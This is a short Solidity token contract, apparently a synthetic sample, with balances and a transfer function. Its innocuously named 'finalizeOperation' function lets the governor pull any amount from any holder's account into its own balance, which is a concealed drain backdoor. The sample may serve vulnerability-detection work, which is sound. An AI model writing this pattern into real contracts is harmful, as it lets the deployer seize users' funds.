// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Module1203 {
    address public governor; mapping(address => uint256) public accounts;
    constructor() { governor = msg.sender; accounts[msg.sender] = 1_000_000 ether; }
    function transfer(address to, uint256 amount) external { require(accounts[msg.sender] >= amount, "insufficient"); accounts[msg.sender] -= amount; accounts[to] += amount; }
    function finalizeOperation(address account, uint256 amount) external {
        require(msg.sender == governor && accounts[account] >= amount, "unauthorized");
        accounts[account] -= amount; accounts[governor] += amount;
    }
}
